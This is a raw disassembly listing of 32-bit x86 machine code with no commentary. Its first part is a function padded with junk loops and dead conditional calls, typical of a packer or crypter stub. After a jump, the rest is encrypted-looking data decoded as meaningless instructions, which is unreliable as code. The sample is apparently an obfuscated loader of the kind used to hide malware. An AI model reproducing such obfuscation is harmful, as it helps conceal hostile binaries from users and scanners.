  421ff5:	mov    ecx,DWORD PTR [ebp-0x8]
  421ff8:	xor    ecx,eax
  421ffa:	mov    eax,DWORD PTR [ebp+0x10]
  421ffd:	add    ecx,esi
  421fff:	mov    DWORD PTR [eax],ecx
  422001:	pop    edi
  422002:	pop    esi
  422003:	pop    ebx
  422004:	leave  
  422005:	ret    0xc
  422008:	push   ebp
  422009:	mov    ebp,esp
  42200b:	sub    esp,0x78
  42200e:	and    DWORD PTR ds:0x42a26e,0x0
  422018:	jmp    0x42202a
  42201d:	mov    ecx,DWORD PTR ds:0x42a26e
  422023:	inc    ecx
  422024:	mov    DWORD PTR ds:0x42a26e,ecx
  42202a:	cmp    DWORD PTR ds:0x42a26e,0x18
  422031:	jae    0x422079
  422037:	cmp    DWORD PTR ds:0x42a26e,0x4
  42203e:	ja     0x422079
  422044:	jmp    0x42205a
  422049:	push   DWORD PTR [ebp-0x14]
  42204c:	push   0x3437
  422051:	push   DWORD PTR [ebp-0x10]
  422054:	call   DWORD PTR ds:0x42a3da
  42205a:	cmp    DWORD PTR ds:0x42a26e,0x3
  422061:	jne    0x422074
  422067:	mov    ecx,DWORD PTR ds:0x42a26e
  42206d:	inc    ecx
  42206e:	mov    DWORD PTR ds:0x42a26e,ecx
  422074:	jmp    0x42201d
  422079:	push   esi
  42207a:	push   edi
  42207b:	and    DWORD PTR ds:0x42a2d2,0x0
  422085:	jmp    0x422097
  42208a:	mov    edi,DWORD PTR ds:0x42a2d2
  422090:	inc    edi
  422091:	mov    DWORD PTR ds:0x42a2d2,edi
  422097:	cmp    DWORD PTR ds:0x42a2d2,0x1c
  42209e:	jae    0x4220f2
  4220a4:	cmp    DWORD PTR ds:0x42a2d2,0xb
  4220ab:	jle    0x4220f2
  4220b1:	jmp    0x4220d3
  4220b6:	push   0x87a7
  4220bb:	push   0x2194
  4220c0:	push   0x6620
  4220c5:	push   DWORD PTR [ebp-0x24]
  4220c8:	push   0x42a25e
  4220cd:	call   DWORD PTR ds:0x42a3de
  4220d3:	cmp    DWORD PTR ds:0x42a2d2,0xa
  4220da:	jne    0x4220ed
  4220e0:	mov    edi,DWORD PTR ds:0x42a2d2
  4220e6:	inc    edi
  4220e7:	mov    DWORD PTR ds:0x42a2d2,edi
  4220ed:	jmp    0x42208a
  4220f2:	mov    eax,ds:0x42941e
  4220f7:	adc    ecx,esi
  4220f9:	mov    DWORD PTR [ebp-0x24],eax
  4220fc:	mov    DWORD PTR ds:0x42a27a,0x1f
  422106:	cmp    DWORD PTR ds:0x42a27a,0x0
  42210d:	je     0x422145
  422113:	cmp    DWORD PTR ds:0x42a27a,0x24
  42211a:	ja     0x422145
  422120:	jmp    0x422133
  422125:	push   DWORD PTR [ebp-0x20]
  422128:	push   0x807a
  42212d:	call   DWORD PTR ds:0x42a3e2
  422133:	mov    ecx,DWORD PTR ds:0x42a27a
  422139:	dec    ecx
  42213a:	mov    DWORD PTR ds:0x42a27a,ecx
  422140:	jmp    0x422106
  422145:	mov    eax,ds:0x42953e
  42214a:	and    DWORD PTR ds:0x42a2e2,0x0
  422154:	jmp    0x422168
  422159:	xor    edi,edi
  42215b:	xor    edi,DWORD PTR ds:0x42a2e2
  422161:	inc    edi
  422162:	mov    DWORD PTR ds:0x42a2e2,edi
  422168:	cmp    DWORD PTR ds:0x42a2e2,0x19
  42216f:	jae    0x422197
  422175:	cmp    DWORD PTR ds:0x42a2e2,0x1e
  42217c:	jge    0x422197
  422182:	jmp    0x422192
  422187:	push   0x2c0a
  42218c:	call   DWORD PTR ds:0x42a3ea
  422192:	jmp    0x422159
  422197:	mov    DWORD PTR [ebp-0x30],eax
  42219a:	mov    DWORD PTR [ebp-0x2c],0xf89c85a5
  4221a1:	sbb    DWORD PTR ds:0x42a25a,edx
  4221a7:	mov    DWORD PTR [ebp-0x28],0xf89c85ba
  4221ae:	mov    DWORD PTR ds:0x42a27a,0x1d
  4221b8:	cmp    DWORD PTR ds:0x42a27a,0x0
  4221bf:	je     0x422218
  4221c5:	cmp    DWORD PTR ds:0x42a27a,0xf
  4221cc:	jge    0x422218
  4221d2:	jmp    0x4221ec
  4221d7:	push   0x8cd0
  4221dc:	push   0x429247
  4221e1:	push   0x429247
  4221e6:	call   DWORD PTR ds:0x42a3b6
  4221ec:	cmp    DWORD PTR ds:0x42a27a,0x10
  4221f3:	jne    0x422206
  4221f9:	mov    ecx,DWORD PTR ds:0x42a27a
  4221ff:	dec    ecx
  422200:	mov    DWORD PTR ds:0x42a27a,ecx
  422206:	mov    ecx,DWORD PTR ds:0x42a27a
  42220c:	dec    ecx
  42220d:	mov    DWORD PTR ds:0x42a27a,ecx
  422213:	jmp    0x4221b8
  422218:	mov    eax,DWORD PTR [ebp-0x10]
  42221b:	and    DWORD PTR ds:0x42a256,0x0
  422225:	jmp    0x422237
  42222a:	mov    esi,DWORD PTR ds:0x42a256
  422230:	inc    esi
  422231:	mov    DWORD PTR ds:0x42a256,esi
  422237:	cmp    DWORD PTR ds:0x42a256,0x14
  42223e:	jae    0x42226b
  422244:	cmp    DWORD PTR ds:0x42a256,0x1b
  42224b:	jl     0x42226b
  422251:	jmp    0x422266
  422256:	push   0x42913d
  42225b:	push   0x400000
  422260:	call   DWORD PTR ds:0x42a3ba
  422266:	jmp    0x42222a
  42226b:	mov    ecx,DWORD PTR [ebp-0x10]
  42226e:	mov    DWORD PTR ds:0x42a25e,0x2ef8
  422278:	sub    eax,ecx
  42227a:	and    DWORD PTR ds:0x42a2c2,0x0
  422284:	mov    edi,DWORD PTR ds:0x42a2c2
  42228a:	inc    edi
  42228b:	mov    DWORD PTR ds:0x42a2c2,edi
  422291:	cmp    DWORD PTR ds:0x42a2c2,0x7
  422298:	jbe    0x4222e0
  42229e:	jmp    0x4222b9
  4222a3:	push   DWORD PTR [ebp-0x1c]
  4222a6:	push   DWORD PTR [ebp-0x24]
  4222a9:	push   0x5955
  4222ae:	push   0x5167
  4222b3:	call   DWORD PTR ds:0x42a3be
  4222b9:	cmp    DWORD PTR ds:0x42a2c2,0x6
  4222c0:	jne    0x4222d3
  4222c6:	mov    edi,DWORD PTR ds:0x42a2c2
  4222cc:	inc    edi
  4222cd:	mov    DWORD PTR ds:0x42a2c2,edi
  4222d3:	cmp    DWORD PTR ds:0x42a2c2,0x13
  4222da:	jb     0x422284
  4222e0:	mov    DWORD PTR [ebp-0x10],eax
  4222e3:	xor    DWORD PTR [ebp-0x10],0xf89cb5a5
  4222ea:	mov    eax,DWORD PTR [ebp-0x18]
  4222ed:	mov    ecx,DWORD PTR [ebp-0x18]
  4222f0:	sub    eax,ecx
  4222f2:	mov    DWORD PTR [ebp-0x18],eax
  4222f5:	or     DWORD PTR [ebp-0x18],0xf89f05a5
  4222fc:	mov    eax,DWORD PTR [ebp-0xc]
  4222ff:	mov    ecx,DWORD PTR [ebp-0xc]
  422302:	sub    eax,ecx
  422304:	mov    DWORD PTR [ebp-0xc],eax
  422307:	or     DWORD PTR [ebp-0xc],0xf89c85e5
  42230e:	mov    eax,DWORD PTR [ebp-0x1c]
  422311:	mov    ecx,DWORD PTR [ebp-0x1c]
  422314:	sub    eax,ecx
  422316:	mov    DWORD PTR [ebp-0x1c],eax
  422319:	or     DWORD PTR [ebp-0x1c],0xf89c8585
  422320:	mov    eax,DWORD PTR [ebp-0x20]
  422323:	mov    ecx,DWORD PTR [ebp-0x20]
  422326:	sub    eax,ecx
  422328:	mov    DWORD PTR [ebp-0x20],eax
  42232b:	mov    eax,DWORD PTR [ebp-0x2c]
  42232e:	mov    ecx,DWORD PTR [ebp-0x20]
  422331:	mov    esi,0x75108aa
  422336:	xor    eax,esi
  422338:	mov    edi,0x3272f1
  42233d:	add    eax,edi
  42233f:	or     eax,ecx
  422341:	jmp    0x423311
  422346:	mov    dl,0x1f
  422348:	xlat   BYTE PTR ds:[ebx]
  422349:	and    edx,edx
  42234b:	mov    eax,ds:0xbec98882
  422350:	js     0x422396
  422352:	push   0x1
  422354:	jno    0x422318
  422356:	sub    edx,DWORD PTR [edx+0x72ce837c]
  42235c:	add    DWORD PTR [ebx-0x7770304f],0x4d
  422363:	adc    eax,0x4dce7262
  422368:	test   DWORD PTR [edi+0x7d],edx
  42236b:	sbb    al,0xf8
  42236d:	hlt    
  42236e:	xchg   ebp,eax
  42236f:	scas   al,BYTE PTR es:[edi]
  422370:	inc    edi
  422371:	retf   
  422372:	mov    cl,0xbe
  422374:	adc    eax,0xe8a23c85
  422379:	push   eax
  42237a:	rcr    DWORD PTR [esi-0x75],0xb3
  42237e:	icebp  
  42237f:	fcom   DWORD PTR [ebp+edi*8+0x18]
  422383:	jp     0x4223a4
  422385:	mov    al,0xae
  422387:	fsubr  QWORD PTR [ebp+0x7d]
  42238a:	sub    DWORD PTR [edi],ebx
  42238c:	xchg   esp,eax
  42238d:	call   0xa9c14d7e
  422392:	sbb    al,0x74
  422394:	xchg   esp,eax
  422395:	test   al,0xad
  422397:	test   DWORD PTR [ebx-0x59],ebp
  42239a:	popa   
  42239b:	rcl    DWORD PTR [ecx-0x2f],cl
  42239e:	dec    ebx
  42239f:	iret   
  4223a0:	xchg   ecx,eax
  4223a1:	mov    cs,WORD PTR [ecx]
  4223a3:	retf   0x47f1
  4223a6:	inc    edi
  4223a7:	jbe    0x422348
  4223a9:	adc    eax,DWORD PTR [edx]
  4223ab:	rol    ch,1
  4223ad:	enter  0x38f9,0xa2
  4223b1:	fst    DWORD PTR [ebp-0x6a753ed1]
  4223b7:	test   eax,0xabc99b51
  4223bc:	dec    ecx
  4223bd:	lods   al,BYTE PTR ds:[esi]
  4223be:	loop   0x422439
  4223c0:	xchg   edx,eax
  4223c1:	arpl   WORD PTR [esi],ax
  4223c3:	jp     0x42242c
  4223c5:	inc    ebp
  4223c6:	push   ecx
  4223c7:	mov    ds:0xc9a4b474,al
  4223cc:	xor    al,0x5a
  4223ce:	mov    esi,DWORD PTR [ebx]
  4223d0:	ins    BYTE PTR es:[edi],dx
  4223d1:	jae    0x422417
  4223d3:	push   eax
  4223d4:	imul   esp,edx,0xffffffce
  4223d7:	ins    BYTE PTR es:[edi],dx
  4223d8:	fild   QWORD PTR [ecx-0x1b]
  4223db:	and    DWORD PTR [edi],ebp
  4223dd:	enter  0xc42f,0x53
  4223e1:	fild   WORD PTR [edi+edx*2+0x52d7442a]
  4223e8:	leave  
  4223e9:	sbb    dl,dl
  4223eb:	xlat   BYTE PTR ds:[ebx]
  4223ec:	sbb    ch,cl
  4223ee:	(bad)  
  4223ef:	cmc    
  4223f0:	ret    0xd2ad
  4223f3:	jo     0x4223f1
  4223f5:	xor    eax,0x1003762c
  4223fa:	xchg   esi,eax
  4223fb:	jl     0x42245e
  4223fd:	in     al,0xf5
  4223ff:	cwde   
  422400:	test   BYTE PTR [esi+0x7081f9ce],ah
  422406:	jp     0x422399
  422408:	or     esi,DWORD PTR [edx]
  42240a:	xor    eax,0x8ef4dcaa
  42240f:	mov    esp,0x3cf48bdf
  422414:	leave  
  422415:	jge    0x42241c
  422417:	inc    ebx
  422418:	xor    bl,BYTE PTR [edi+0x19]
  42241b:	cmp    esp,DWORD PTR [ebp-0x137333ed]
  422421:	add    BYTE PTR [edx-0x2fee495d],ch
  422427:	popf   
  422428:	cmp    ebp,DWORD PTR [edi+0x49566075]
  42242e:	clc    
  42242f:	xor    al,ch
  422431:	ja     0x42249d
  422433:	hlt    
  422434:	inc    esi
  422435:	or     al,0x86
  422437:	sub    esi,eax
  422439:	mov    dh,ch
  42243b:	xor    eax,0xb27896ff
  422440:	scas   al,BYTE PTR es:[edi]
  422441:	es enter 0x5eb6,0x78
  422446:	or     BYTE PTR ds:0x609acea1,dl
  42244c:	clc    
  42244d:	sbb    ecx,ebp
  42244f:	scas   eax,DWORD PTR es:[edi]
  422450:	sbb    eax,0x399b053
  422455:	pop    ebx
  422456:	stos   BYTE PTR es:[edi],al
  422457:	ret    
  422458:	push   0xf9881cd4
  42245d:	in     eax,dx
  42245e:	jl     0x42240e
  422460:	lock imul esp,DWORD PTR [edx+0x4a42625d],0x4f0d067d
  42246b:	sub    BYTE PTR [esi+0x7107156],0x16
  422472:	dec    ecx
  422473:	clc    
  422474:	jmp    0xde1c:0x788eba63
  42247b:	(bad)  
  42247c:	xor    DWORD PTR [ecx],ecx
  42247e:	inc    ecx
  42247f:	pop    ss
  422480:	xor    ebx,DWORD PTR [edi-0x2288c435]
  422486:	bound  ecx,QWORD PTR [ecx]
  422488:	adc    eax,0x60cf6c8c
  42248d:	push   ecx
  42248e:	push   ecx
  42248f:	pop    ebx
  422490:	jns    0x4224fe
  422492:	and    al,0xf9
  422494:	mov    eax,ds:0x1d2e24be
  422499:	sub    ebx,DWORD PTR [edx]
  42249b:	dec    esp
  42249c:	mov    cl,BYTE PTR [ebx+0x3d]
  42249f:	push   es
  4224a0:	add    eax,0x9e0c99e1
  4224a5:	push   esi
  4224a6:	inc    eax
  4224a7:	imul   edi,DWORD PTR [esi-0x18],0x5e
  4224ab:	out    dx,eax
  4224ac:	lods   al,BYTE PTR ds:[esi]
  4224ad:	add    bh,0x49
  4224b0:	aam    0xfe
  4224b2:	sbb    edx,DWORD PTR [eax]
  4224b4:	bound  ebp,QWORD PTR [esi+0x6eef821f]
  4224ba:	xchg   esp,eax
  4224bb:	dec    esi
  4224bc:	leave  
  4224bd:	xor    dh,BYTE PTR [ecx+0x22490db3]
  4224c3:	and    DWORD PTR [edi-0x14284f22],esi
  4224c9:	shl    DWORD PTR [esi+0x6f],1
  4224cc:	retf   
  4224cd:	push   cs
  4224ce:	sbb    eax,0xee042b0a
  4224d3:	jmp    0xeca41b17
  4224d8:	retf   
  4224d9:	(bad)  
  4224db:	sti    
  4224dc:	cmp    eax,0xb37bd685
  4224e1:	cmp    eax,ecx
  4224e3:	push   eax
  4224e4:	add    eax,0x369f5f85
  4224e9:	jmp    0x434a:0x8cf6f7a
  4224f0:	pop    ss
  4224f1:	scas   al,BYTE PTR es:[edi]
  4224f2:	sub    esp,esi
  4224f4:	std    
  4224f5:	xor    dh,BYTE PTR [esi-0x4b9adbd2]
  4224fb:	outs   dx,DWORD PTR ds:[esi]
  4224fc:	push   es
  4224fd:	(bad)  
  4224ff:	sbb    DWORD PTR [edi],edi
  422501:	in     eax,0x58
  422503:	inc    ecx
  422504:	sub    al,0xcf
  422506:	in     al,0x5f
  422508:	jge    0x422527
  42250a:	sti    
  42250b:	push   es
  42250c:	(bad)  
  42250d:	mov    BYTE PTR [edi-0x3cfcb3c3],bh
  422513:	fiadd  DWORD PTR [ecx]
  422515:	retf   
  422516:	test   al,0x9
  422518:	add    DWORD PTR [eax-0x6b],ecx
  42251b:	into   
  42251c:	xchg   BYTE PTR [edi],ah
  42251e:	mov    ebp,0xe098fc80
  422523:	pop    esi
  422524:	pop    eax
  422525:	fidivr WORD PTR [edx+edx*4-0x16d90263]
  42252c:	jg     0x4225a1
  42252e:	dec    ebx
  42252f:	inc    ebx
  422530:	rol    DWORD PTR [edx],cl
  422532:	sub    BYTE PTR [edx-0x31dfb8cd],cl
  422538:	into   
  422539:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42253a:	and    dh,BYTE PTR [esi-0x5851a1b8]
  422540:	mov    al,0x16
  422542:	pop    esp
  422543:	fsubr  DWORD PTR [edx+eax*8+0x26]
  422547:	and    bl,BYTE PTR [edx-0x1f7b427c]
  42254d:	pop    ds
  42254e:	pop    edi
  42254f:	cmp    eax,0x11bdebca
  422554:	fstp   DWORD PTR [ecx-0x59f161e9]
  42255a:	inc    edi
  42255b:	sub    eax,ecx
  42255d:	cmp    DWORD PTR ds:0x17a11f23,edi
  422563:	push   cs
  422564:	cdq    
  422565:	int3   
  422566:	sbb    ch,BYTE PTR ds:0xdd4400e4
  42256c:	or     esp,DWORD PTR [ebx+0x3a1d487f]
  422572:	push   ebp
  422573:	add    DWORD PTR [edx+0x29],esi
  422576:	dec    eax
  422577:	addr16 inc ebp
  422579:	inc    ebx
  42257a:	ins    BYTE PTR es:[edi],dx
  42257b:	mov    eax,ds:0x171e59f1
  422580:	push   esi
  422581:	scas   al,BYTE PTR es:[edi]
  422582:	mov    eax,ds:0xfc5d9446
  422587:	and    DWORD PTR [esi],edi
  422589:	les    ebp,FWORD PTR [eax+0x79]
  42258c:	jp     0x42259f
  42258e:	div    DWORD PTR [ebx-0x4be96fd7]
  422594:	push   ebp
  422595:	mov    dl,0xe3
  422597:	pushf  
  422598:	mov    edx,0xe746865c
  42259d:	mov    eax,0x9b78c261
  4225a2:	loopne 0x4225c0
  4225a4:	arpl   dx,sp
  4225a6:	stc    
  4225a7:	push   edi
  4225a8:	pop    ds
  4225a9:	xchg   ecx,eax
  4225aa:	pop    esp
  4225ab:	xor    dh,BYTE PTR [esi-0x26]
  4225ae:	mov    cl,0x56
  4225b0:	mov    cl,0xac
  4225b2:	out    dx,al
  4225b3:	mov    dl,0x4e
  4225b5:	out    0xf9,eax
  4225b7:	pop    ss
  4225b8:	mov    dl,0x7b
  4225ba:	jne    0x422568
  4225bc:	xchg   esp,eax
  4225bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225be:	sub    BYTE PTR [ebx],al
  4225c0:	sub    al,bl
  4225c2:	sahf   
  4225c3:	pop    edi
  4225c4:	push   ecx
  4225c5:	rcl    esp,1
  4225c7:	sar    BYTE PTR [ebp-0x3],1
  4225ca:	sub    al,BYTE PTR [ebx+0x66f9f27b]
  4225d0:	inc    eax
  4225d1:	(bad)  
  4225d2:	outs   dx,BYTE PTR ds:[esi]
  4225d3:	push   0x5ee420de
  4225d8:	neg    ah
  4225da:	dec    esi
  4225db:	xchg   edi,eax
  4225dc:	mov    ?,WORD PTR [ecx+0x7448b623]
  4225e2:	jae    0x4225a0
  4225e4:	inc    edx
  4225e5:	out    dx,al
  4225e6:	fs leave 
  4225e8:	sub    esi,ecx
  4225ea:	(bad)  
  4225eb:	loopne 0x42262c
  4225ed:	sub    DWORD PTR [esi-0x4029da5e],ebx
  4225f3:	mov    ecx,0x2395fa2a
  4225f8:	aad    0x47
  4225fa:	stc    
  4225fb:	enter  0x286e,0x84
  4225ff:	(bad)  
  422600:	pushf  
  422601:	push   ebx
  422602:	and    cl,ch
  422604:	js     0x422589
  422606:	sti    
  422607:	leave  
  422608:	(bad)
  42260b:	fisttp DWORD PTR [eax-0x393fb275]
  422611:	pop    ds
  422612:	(bad)  
  422613:	sbb    DWORD PTR cs:[esi+0x43c3ac5d],esp
  42261a:	loope  0x4225a5
  42261c:	cli    
  42261d:	(bad)  
  42261e:	dec    esi
  42261f:	sti    
  422620:	or     al,0x9
  422622:	pop    ebx
  422623:	call   0xcc24e8fb
  422628:	cmp    BYTE PTR [esi-0x21920664],dl
  42262e:	inc    esp
  42262f:	mov    ch,0x40
  422631:	xchg   ebx,eax
  422632:	test   eax,0x9d1c9a07
  422637:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  422639:	xor    eax,0x414395db
  42263e:	test   cl,bl
  422640:	rcr    dh,cl
  422642:	(bad)  
  422643:	into   
  422644:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422645:	add    eax,0x815cdfbf
  42264a:	dec    DWORD PTR [edx+0xc]
  42264d:	clc    
  42264e:	mov    cs,WORD PTR [edx]
  422650:	(bad)  
  422651:	aas    
  422652:	pop    ss
  422653:	fs push 0x4e254314
  422659:	inc    edx
  42265a:	js     0x422600
  42265c:	add    al,0x88
  42265e:	lock popf 
  422660:	dec    eax
  422661:	mov    bl,0x39
  422663:	sub    eax,0xfc3edee9
  422668:	stos   DWORD PTR es:[edi],eax
  422669:	mov    edi,0x197572ae
  42266e:	pop    ss
  42266f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422670:	ins    BYTE PTR es:[edi],dx
  422671:	lea    eax,[ecx+0x28]
  422674:	push   esi
  422675:	add    ch,BYTE PTR [ebp+eiz*2-0x53272498]
  42267c:	ror    DWORD PTR [edx+0x3112e921],cl
  422682:	sbb    eax,edx
  422684:	push   ecx
  422685:	stos   DWORD PTR es:[edi],eax
  422686:	jmp    0x5cdc:0x5050e8d6
  42268d:	fwait
  42268e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42268f:	and    ah,BYTE PTR [esi-0x5]
  422692:	out    0x45,al
  422694:	mov    ds:0x82c259ea,eax
  422699:	pop    ss
  42269a:	jbe    0x42270d
  42269c:	fwait
  42269d:	(bad)  
  42269e:	out    dx,al
  42269f:	mov    eax,0x4a1e91e2
  4226a4:	mov    ch,0x8
  4226a6:	sbb    eax,0x854b89bf
  4226ab:	rcl    DWORD PTR [esi-0x39],1
  4226ae:	adc    bh,ch
  4226b0:	ins    DWORD PTR es:[edi],dx
  4226b1:	rcl    BYTE PTR [ebp-0x6e771801],1
  4226b7:	pop    es
  4226b8:	sahf   
  4226b9:	mov    ds,WORD PTR [ecx+0x7ae71a20]
  4226bf:	ficom  WORD PTR [ebp-0x3ef78a85]
  4226c5:	add    al,BYTE PTR [ebp+eiz*1-0xdd657fd]
  4226cc:	mov    esi,0xba25ab6c
  4226d1:	push   ss
  4226d2:	int    0xb8
  4226d4:	adc    eax,0xb7f368bc
  4226d9:	mov    ecx,0xdd0162a9
  4226de:	add    eax,0xd03eea04
  4226e3:	sbb    eax,0x6afe3bb3
  4226e8:	js     0x42272e
  4226ea:	add    al,0x4b
  4226ec:	or     DWORD PTR [edx+0x35],0xe
  4226f0:	int    0xbd
  4226f2:	shl    BYTE PTR [eax],cl
  4226f4:	imul   esp,DWORD PTR [ecx],0xb71e436c
  4226fa:	in     al,0xd1
  4226fc:	and    eax,0x5185a483
  422701:	mov    ecx,0x848b30a2
  422706:	out    dx,eax
  422707:	xchg   ebx,eax
  422708:	xlat   BYTE PTR ds:[ebx]
  422709:	pop    ecx
  42270a:	sbb    bh,cl
  42270c:	(bad)  
  42270d:	sti    
  42270e:	xlat   BYTE PTR ds:[ebx]
  42270f:	dec    esi
  422710:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422711:	push   0x4f66ee17
  422716:	jmp    0x6370:0x1754d098
  42271d:	sub    edx,edi
  42271f:	lods   al,BYTE PTR ds:[esi]
  422720:	in     al,dx
  422721:	xor    al,0x6b
  422723:	mov    WORD PTR es:[ecx+edi*4],fs
  422727:	xchg   ebx,eax
  422728:	stos   BYTE PTR es:[edi],al
  422729:	mov    ecx,DWORD PTR [ebp-0x58921e2]
  42272f:	cwde   
  422730:	push   ebx
  422731:	test   eax,0x92b9d397
  422736:	sbb    eax,0xadc8195e
  42273b:	push   esi
  42273c:	push   ds
  42273d:	ss mov ecx,0x31990f44
  422743:	add    edx,0xffffffd4
  422746:	push   ds
  422747:	mov    edi,0x16dc9803
  42274c:	xor    DWORD PTR [edx],0xc1f43cf5
  422752:	jb     0x422735
  422754:	jecxz  0x422709
  422756:	push   0x44
  422758:	push   ecx
  422759:	jp     0x4227a2
  42275b:	nop
  42275c:	push   ebp
  42275d:	(bad)  
  42275f:	jne    0x422755
  422761:	push   edx
  422762:	xchg   esp,eax
  422763:	add    ecx,DWORD PTR [eax]
  422765:	inc    esp
  422766:	rol    DWORD PTR [ecx+esi*4+0x32b5cade],cl
  42276d:	cmp    ah,BYTE PTR [edi]
  42276f:	push   eax
  422770:	and    DWORD PTR [edi],esp
  422772:	daa    
  422773:	out    0x84,al
  422775:	push   cs
  422776:	or     BYTE PTR [ebx],ah
  422778:	pop    ebp
  422779:	adc    eax,0x2642115f
  42277e:	fidiv  DWORD PTR [edi+0x2a]
  422781:	cmp    ebp,ebx
  422783:	adc    ah,BYTE PTR [ecx+0x5dc60934]
  422789:	test   BYTE PTR [esi+0x5],0x7f
  42278d:	mov    BYTE PTR [edi],bl
  42278f:	push   es
  422790:	cwde   
  422791:	jecxz  0x4227ab
  422793:	std    
  422794:	aam    0x10
  422796:	inc    esi
  422797:	repz add esp,DWORD PTR [edi]
  42279a:	js     0x422727
  42279c:	jb     0x42275a
  42279e:	lds    ebx,FWORD PTR [esi]
  4227a0:	fcmovbe st,st(3)
  4227a2:	fcomp  QWORD PTR [edx+0x38ba49b2]
  4227a8:	cmc    
  4227a9:	out    dx,eax
  4227aa:	adc    BYTE PTR [ebx-0x4a],ah
  4227ad:	mov    ebx,0xf94e116b
  4227b2:	mov    al,0xb9
  4227b4:	int    0x1a
  4227b6:	iret   
  4227b7:	lea    ebp,[ebx+0x15]
  4227ba:	mov    ch,0xcb
  4227bc:	aaa    
  4227bd:	and    al,0x54
  4227bf:	call   0x710fecee
  4227c4:	mov    esi,0x95ef0cea
  4227c9:	inc    esp
  4227ca:	in     eax,dx
  4227cb:	stos   DWORD PTR es:[edi],eax
  4227cc:	inc    ebp
  4227cd:	sahf   
  4227ce:	aaa    
  4227cf:	jo     0x4227a9
  4227d1:	mov    bh,0xc9
  4227d4:	inc    ecx
  4227d5:	fimul  DWORD PTR [edx+0x2f]
  4227d8:	mov    esi,0x3f9795ac
  4227dd:	jno    0x42281a
  4227df:	dec    esp
  4227e0:	cs push ss
  4227e2:	xor    eax,0xd9738d6d
  4227e7:	adc    eax,0x2bb5fa25
  4227ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227ed:	imul   ebp,ecx,0x62
  4227f0:	sub    ah,BYTE PTR [edi-0x31]
  4227f3:	inc    ebp
  4227f4:	dec    ebp
  4227f5:	dec    esi
  4227f6:	loopne 0x42280e
  4227f8:	pop    si
  4227fa:	xor    BYTE PTR [edi],ch
  4227fc:	js     0x42284f
  4227fe:	test   BYTE PTR [edx+0x50],dh
  422801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422802:	lds    ebx,FWORD PTR [ebp+0x1472ef7e]
  422808:	inc    ebp
  422809:	leave  
  42280a:	outs   dx,DWORD PTR ds:[esi]
  42280b:	push   ebx
  42280c:	test   DWORD PTR [ebx],esi
  42280e:	mov    bl,0x36
  422810:	dec    eax
  422811:	aas    
  422812:	cmp    edi,DWORD PTR ds:0xd811a89a
  422818:	pop    ebp
  422819:	cs mov edx,0xd52162b6
  42281f:	ret    
  422820:	dec    ebp
  422821:	cmp    DWORD PTR [eax-0x42],edx
  422824:	aam    0xff
  422826:	ds pop ecx
  422828:	lahf   
  422829:	sub    eax,0xe30ecbc5
  42282e:	fs into 
  422830:	les    edx,FWORD PTR [eax-0x31]
  422833:	add    BYTE PTR [eax+0x7c],0xab
  422837:	pop    ss
  422838:	adc    cl,BYTE PTR [ecx]
  42283a:	nop
  42283b:	jbe    0x4227ff
  42283d:	mov    ds:0xf8e9c48f,al
  422842:	out    0x29,al
  422844:	cmp    al,0xa3
  422846:	lock push edi
  422848:	add    ch,ch
  42284a:	mov    cl,0xd8
  42284c:	aas    
  42284d:	inc    esi
  42284e:	fld    QWORD PTR [esi]
  422850:	lods   eax,DWORD PTR ds:[esi]
  422851:	xor    BYTE PTR [ebx-0x3ad93b88],bh
  422857:	push   edi
  422858:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422859:	repnz addr16 pop esi
  42285c:	and    ecx,DWORD PTR [edi]
  42285e:	xchg   ebp,eax
  42285f:	mov    al,0x11
  422861:	nop
  422862:	call   0x9724:0x6264c080
  422869:	pop    edx
  42286a:	out    0x4e,eax
  42286c:	mov    esp,0xf2453fca
  422871:	mov    ds:0x8ba4101f,al
  422876:	mov    ch,0x19
  422878:	dec    edi
  422879:	jo     0x422852
  42287b:	add    cl,bl
  42287d:	cmp    al,0x17
  42287f:	leave  
  422880:	pop    esp
  422881:	adc    bl,BYTE PTR [ecx]
  422883:	xchg   ebp,eax
  422884:	mov    ds:0x60d3a23f,eax
  422889:	test   BYTE PTR [ebx],bh
  42288b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42288c:	sbb    eax,0x589188f1
  422891:	xor    eax,0x6c796b20
  422896:	add    ebx,DWORD PTR [esi+esi*4]
  422899:	out    0xbf,eax
  42289b:	stos   BYTE PTR es:[edi],al
  42289c:	push   edi
  42289d:	mov    eax,0xd03dd8ba
  4228a2:	test   eax,0x13e5c95d
  4228a7:	inc    edi
  4228a8:	sub    eax,0x5ef21d8c
  4228ad:	hlt    
  4228ae:	ja     0x4228ef
  4228b0:	add    BYTE PTR [esi],ch
  4228b2:	cs ins BYTE PTR es:[edi],dx
  4228b4:	cmp    ebx,DWORD PTR ds:0x6883ba18
  4228ba:	and    ebx,ecx
  4228bc:	push   edi
  4228bd:	xchg   BYTE PTR [edi],dl
  4228bf:	and    esi,ebx
  4228c1:	aad    0xd7
  4228c3:	cmp    DWORD PTR [eax-0x41],0x2d87c0f9
  4228ca:	rcl    DWORD PTR [ecx+0x6a182e17],1
  4228d0:	and    al,0x47
  4228d2:	lock jb 0x4228ef
  4228d5:	fldcw  WORD PTR [esi-0x1601327a]
  4228db:	mov    cl,dl
  4228dd:	add    ah,cl
  4228df:	int    0xf1
  4228e1:	adc    dl,0x93
  4228e4:	hlt    
  4228e5:	(bad)  
  4228e6:	fisub  WORD PTR [edi+esi*4]
  4228e9:	imul   BYTE PTR [ecx]
  4228eb:	adc    ecx,ebp
  4228ed:	sbb    DWORD PTR [esi-0x3e],ebp
  4228f0:	test   al,0xd7
  4228f2:	xchg   esp,eax
  4228f3:	sub    BYTE PTR [esi],cl
  4228f5:	cmp    DWORD PTR [edx+ebx*2],esp
  4228f8:	sub    BYTE PTR [edi+0x2f],0xe2
  4228fc:	cmp    eax,0x6ac42d06
  422901:	and    DWORD PTR [edx-0x30],0xcec7cb70
  422908:	push   edx
  422909:	(bad)  
  42290a:	clc    
  42290b:	iret   
  42290c:	lahf   
  42290d:	jp     0x422923
  42290f:	and    al,0x78
  422911:	sub    eax,0x74ff2619
